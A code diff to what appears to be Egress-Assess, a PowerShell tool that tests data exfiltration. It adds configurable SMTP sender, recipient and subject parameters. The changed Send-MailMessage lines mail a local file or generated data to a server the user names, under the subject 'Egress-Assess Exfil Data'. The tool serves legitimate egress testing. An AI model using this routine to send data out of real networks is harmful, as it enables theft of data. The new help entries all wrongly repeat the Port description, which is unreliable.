@@ -59,6 +59,15 @@ function Invoke-EgressAssess
 
 .Parameter Port
     The port is if you wish to specify a non-standard port for data transfer(s)
+    
+.Parameter SMTP_To
+    The port is if you wish to specify a non-standard port for data transfer(s)
+
+.Parameter SMTP_From
+    The port is if you wish to specify a non-standard port for data transfer(s)
+
+.Parameter SMTP_Subject
+    The port is if you wish to specify a non-standard port for data transfer(s)
 
 .Example
     Import-Module Egress-Assess.ps1
@@ -92,6 +101,12 @@ function Invoke-EgressAssess
         [string]$Password,
         [Parameter(Mandatory = $False)]
         [int]$Port,
+        [Parameter(Mandatory = $False)]
+        [string]$SMTP_To,
+        [Parameter(Mandatory = $False)]
+        [string]$SMTP_From,
+        [Parameter(Mandatory = $False)]
+        [string]$SMTP_Subject,
         [Parameter(Mandatory = $False)]
         [int]$Size = 1,
         [Parameter(Mandatory = $False)]
@@ -1701,14 +1716,29 @@ function Invoke-EgressAssess
                     {
                         $Port = 25
                     }
-
+                    
+                    if (!$SMTP_To)
+                    {
+                        $SMTP_To = "server@egress-asses.com"
+                    }
+                    
+                    if (!$SMTP_From)
+                    {
+                        $SMTP_From = "tester@egress-assess.com"
+                    }
+                    
+                    if (!$SMTP_Subject)
+                    {
+                        $SMTP_Subject = "Egress-Assess Exfil Data"
+                    }
+                    
                     if ($filetransfer -eq $true)
                     {
-                        Send-MailMessage -From tester@egress-assess.com -To server@egress-asses.com -Subject "Egress-Assess Exfil Data" -Body "EgressAssess With Attachment" -Attachments "$SourceFilePath" -SmtpServer $IP -Port $Port
+                        Send-MailMessage -From $SMTP_From -To $SMTP_To -Subject $SMTP_Subject -Body "EgressAssess With Attachment" -Attachments "$SourceFilePath" -SmtpServer $IP -Port $Port
                     }
                     else
                     {
-                        Send-MailMessage -From tester@egress-assess.com -To server@egress-asses.com -Subject "Egress-Assess Exfil Data" -Body "$SMTPData" -SmtpServer $IP -Port $Port
+                        Send-MailMessage -From $SMTP_From -To $SMTP_To -Subject $SMTP_Subject -Body "$SMTPData" -SmtpServer $IP -Port $Port
                     }
                 }
                 catch
